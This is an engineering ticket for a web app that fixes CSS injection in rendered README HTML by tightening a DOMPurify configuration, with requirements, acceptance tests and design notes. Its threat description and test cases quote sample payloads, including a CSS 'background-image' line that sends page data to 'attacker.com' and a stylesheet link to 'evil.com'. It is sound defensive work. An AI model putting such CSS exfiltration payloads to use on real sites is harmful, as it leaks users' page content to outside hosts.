# 041 — Security: Restrict DOMPurify Config to Prevent CSS Injection

**Status:** ✅ Complete
**Severity:** MEDIUM
**Source:** Security review 2026-06-09 (M5)

---

## Phase 1 — Problem & Goal

### What is broken today

`frontend/components/readme-render.tsx` line 11 calls `DOMPurify.sanitize(html)` with no options:

```typescript
const clean = useMemo(() => DOMPurify.sanitize(html), [html]);
```

DOMPurify's default config permits `<style>` tags and `style=` attributes. The `html` value originates from GitHub's rendered-HTML API (`Accept: application/vnd.github.html+json`, `backend/app/services/github.py` line 195), stored verbatim in MongoDB `readme_html`, and served to the frontend via the `/api/skills/{slug}` endpoint. Any authenticated AKH user who controls a GitHub repository can craft a README with a `<style>` block that survives the fetch path unchanged and reaches `dangerouslySetInnerHTML` in the browser.

Attack vectors enabled by unrestricted CSS:
1. **UI overlay / phishing** — `position:fixed; top:0; left:0; width:100%; height:100%` impersonates AKH UI within the same origin (high credibility).
2. **Content defacement** — hide legitimate skill metadata.
3. **CSS data exfiltration** — `background-image: url(https://attacker.com/?data=...)` combined with attribute selectors to leak page content over the network.

XSS is blocked by DOMPurify itself; this is a CSS-only bypass.

### Success state after the fix

- `<style>…</style>` blocks in `readme_html` are stripped before reaching the DOM.
- `style="…"` attributes on any element are stripped.
- `<link rel="stylesheet">` tags are stripped (external stylesheet loading).
- Normal README content — headings, code blocks, images, links, tables — renders identically.

### Out of scope

- Sanitisation of `readme_raw` / `skillMdRaw` (both rendered via `MarkdownRender`, not `ReadmeRender`).
- Server-side HTML sanitisation of stored content in MongoDB (defence-in-depth, separate task).
- Stripping other potentially dangerous HTML that DOMPurify already handles.

### Constraints

- Must not break existing auth flow (no backend changes required).
- Single-file frontend change; deployed via standard Next.js image rebuild (kustomize overlay bump).
- Must not introduce `isomorphic-dompurify` version change (stay on `^2.15.0`).

---

## Phase 1.5 — User Stories

1. As an **authenticated AKH user**, I want CSS in a skill's README stripped before rendering, so that a malicious skill author cannot overlay fake UI on the AKH page I am browsing.
2. As a **skill author**, I want my legitimate README content (headings, code, images, tables) to render correctly after the fix, so that adding the restriction does not degrade my skill's presentation.
3. As an **attacker who controls a GitHub repo**, I want to inject a `<style>` block into my README that persists through GitHub's HTML renderer and DOMPurify, but the fix prevents this so my CSS payload is stripped.
4. As an **attacker**, I want to load an external stylesheet via `<link rel="stylesheet" href="…">` to exfiltrate data or restyle the page, but the fix forbids `<link>` tags.
5. As an **attacker**, I want to use `style="background-image: url(attacker.com/…)"` on an element to exfiltrate page data, but the fix strips `style=` attributes.
6. As an **admin**, I want the fix to be low-risk and reversible so that a regression doesn't require a hotfix pipeline — a one-line config change satisfies this.
7. As a **developer**, I want a focused unit test that verifies CSS injection is blocked, so that the protection is documented as executable spec and cannot silently regress.
8. As a **security reviewer**, I want the fix confined to the DOMPurify call site so that the change surface is minimal and easy to audit.

---

## Phase 2 — Requirements

### Functional requirements

**FR-1:** `DOMPurify.sanitize()` in `readme-render.tsx` must pass `FORBID_TAGS: ["style", "link"]` so that `<style>` and `<link>` elements are removed from the output regardless of their content.

**FR-2:** `DOMPurify.sanitize()` must pass `FORBID_ATTR: ["style"]` so that inline `style=` attributes on any element are stripped from the output.

**FR-3:** The sanitised output must continue to include `<h1>`–`<h6>`, `<code>`, `<pre>`, `<img>`, `<a>`, `<table>`, `<thead>`, `<tbody>`, `<tr>`, `<td>`, `<th>`, `<ul>`, `<ol>`, `<li>`, and `<p>` elements (standard GitHub-rendered README elements).

### Non-functional requirements

**NFR-1 (Performance):** The config object is a plain object literal evaluated once per `useMemo` cache miss; the added overhead is < 0.1 ms per render and negligible at runtime.

**NFR-2 (Compatibility):** No change to the backend API contract, MongoDB schema, or any other frontend component. The `ReadmeRender` component's prop interface (`html: string`) is unchanged.

**NFR-3 (Testability):** The fix is testable with a pure unit test (no browser, no server) using `isomorphic-dompurify` directly.

### Acceptance criteria

**AC-1:** Given a `readme_html` value containing `<style>.x { position: fixed; top: 0 }</style>`, when rendered by `ReadmeRender`, then the rendered DOM contains no `<style>` element.

**AC-2:** Given a `readme_html` value containing `<p style="color:red">text</p>`, when rendered by `ReadmeRender`, then the rendered DOM contains `<p>text</p>` with no `style` attribute.

**AC-3:** Given a `readme_html` value containing `<link rel="stylesheet" href="https://evil.com/x.css">`, when rendered by `ReadmeRender`, then the rendered DOM contains no `<link>` element.

**AC-4:** Given a `readme_html` value containing standard GitHub-rendered markdown (headings, code blocks, images, links, tables), when rendered by `ReadmeRender`, then all those elements are present in the DOM unchanged.

---

## Phase 3 — ADRs

**ADR-041-1: Forbid CSS at the DOMPurify call site rather than sanitising server-side**

Status: Accepted

Context: CSS injection reaches the browser through `dangerouslySetInnerHTML`. The fix could go at the storage layer (strip CSS when writing to MongoDB) or at the render layer (strip CSS at DOMPurify).

Options considered:
- Server-side stripping on ingest (backend `github.py` or `github_scan.py`) — removes CSS from stored data permanently; requires backend change and re-scan of existing skills.
- Client-side DOMPurify config — strips CSS at render time; no backend change, no data migration, confined to one file.
- Both layers — defence in depth.

Decision: Client-side DOMPurify config only, for this ticket. The browser render layer is the correct last line of defence for untrusted HTML. A server-side strip is a separate, larger concern (requires re-scan and migration). Adding it later as defence-in-depth is low friction.

Consequences: Existing `readme_html` values in MongoDB may still contain `<style>` blocks; they are harmless because the browser never renders them after this fix. A future task can clean stored data if desired.

---

## Phase 3.5 — Module Design

| Module/file | Change type | What changes | Testable in isolation? |
|---|---|---|---|
| `frontend/components/readme-render.tsx` | Config update | Add `FORBID_TAGS` and `FORBID_ATTR` options to `DOMPurify.sanitize()` call on line 11 | Yes — pure unit test with `isomorphic-dompurify` |
| `frontend/components/readme-render.test.tsx` (new) | New test file | Unit tests for AC-1 through AC-4 | Yes — Jest, no server needed |

No other files change. No backend changes. No Kubernetes manifest changes.

---

## Phase 4 — System/Infrastructure Design

### Attack interception point

```
GitHub API (vnd.github.html+json)
        |
        v
  readme_html stored in MongoDB  ← CSS present here after fix (harmless)
        |
        v
  GET /api/skills/{slug}  →  frontend BFF  →  skill detail page
        |
        v
  SkillContentTabs (skill-content-tabs.tsx line 80)
    readmeHtml prop → <ReadmeRender html={readmeHtml} />
        |
        v
  *** FIX INTERCEPTS HERE ***
  DOMPurify.sanitize(html, {
    FORBID_TAGS: ["style", "link"],   ← strips <style> and <link>
    FORBID_ATTR: ["style"],           ← strips style="…"
  })
        |
        v
  dangerouslySetInnerHTML  ← CSS-free HTML reaches DOM
```

### Before / after API contract

No API contract change. The `readme_html` field continues to be served verbatim from MongoDB. Sanitisation is purely client-side.

---

## Design (original — retained)

One-line fix in `frontend/components/readme-render.tsx`:

```typescript
// Before (line 11)
const clean = useMemo(() => DOMPurify.sanitize(html), [html]);

// After
const clean = useMemo(
  () =>
    DOMPurify.sanitize(html, {
      FORBID_TAGS: ["style", "link"],
      FORBID_ATTR: ["style"],
    }),
  [html]
);
```

`link` is also forbidden to prevent loading external stylesheets. This does not affect code highlighting, GitHub markdown structure, or any normal README content — it only strips inline CSS which legitimate READMEs don't need.

---

## Phase 7 — Trade-offs

| Choice | What we gain | What we give up |
|---|---|---|
| Client-side DOMPurify config only | Zero backend risk; one-file change; immediate protection for all existing stored data | Stored `readme_html` in MongoDB still contains CSS (cosmetically harmless; requires a future cleanup pass if desired) |
| Forbid `style=` attributes entirely | Blocks CSS exfiltration via `background-image` on arbitrary elements | Loses any intentional inline styling in READMEs (none in practice; GitHub's renderer strips most anyway) |
| Forbid `<link>` in addition to `<style>` | Blocks external stylesheet loading | No legitimate use case in READMEs; zero content loss |

---

## Phase 8 — Delivery Slices

**Slice 1 (this ticket — ship alone):** Update `DOMPurify.sanitize()` in `readme-render.tsx` with `FORBID_TAGS` / `FORBID_ATTR`. Add unit test file. Deploy via frontend image rebuild.

No further slices required. Server-side sanitisation on ingest is left to a future defence-in-depth task if desired.

---

## Phase 9 — Risk Register

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| DOMPurify `FORBID_ATTR` strips a class or data attribute by name collision | Low | Low — `style` is a presentational attribute with no structural role in rendered markdown | Verify with AC-4 (normal content test) before shipping |
| isomorphic-dompurify behaves differently server-side vs client-side (SSR) | Low | Low — `ReadmeRender` is a `"use client"` component; DOMPurify only runs in the browser | Confirmed by `"use client"` directive on line 1 of `readme-render.tsx` |
| Existing skill READMEs that used intentional `style=` attributes lose their styling | Very low | Very low — GitHub's own renderer strips most inline styles; AKH README display is not a styled-document platform | Acceptable trade-off; no user-facing functionality relies on CSS in READMEs |

---

## Phase 10 — Definition of Done

- [ ] `FORBID_TAGS: ["style", "link"]` and `FORBID_ATTR: ["style"]` added to `DOMPurify.sanitize()` in `frontend/components/readme-render.tsx`
- [ ] `frontend/components/readme-render.test.tsx` created with unit tests covering AC-1, AC-2, AC-3, AC-4
- [ ] All four acceptance criteria pass (Jest unit tests green)
- [ ] Existing frontend tests pass (`npm --prefix frontend test -- --passWithNoTests`)
- [ ] Manual smoke test: open a skill detail page, verify README renders correctly (headings, code blocks, images, tables present)
- [ ] Manual injection test: load a README containing `<style>body{display:none}</style>` and confirm the page body is not hidden
- [ ] Deployed to dev overlay; no visual regressions observed on skill detail page

---

## Implementation Plan

- [ ] Update `DOMPurify.sanitize()` call in `frontend/components/readme-render.tsx`
- [ ] Add `frontend/components/readme-render.test.tsx` with unit tests for CSS stripping and normal content pass-through
- [ ] Test with a README that contains a `<style>` block — confirm it's stripped
- [ ] Test with a README that uses `style="..."` attributes — confirm stripped
- [ ] Verify normal README rendering (headings, code blocks, images, links) unaffected

## Acceptance Criteria

- [ ] A README containing `<style>.overlay { position: fixed; ... }</style>` renders without the style block
- [ ] Normal README content renders correctly
- [ ] GitHub-flavored markdown tables, code blocks, and images still display

## Definition of Done

- [ ] `FORBID_TAGS` and `FORBID_ATTR` added to DOMPurify config
- [ ] Manual test confirms CSS injection blocked
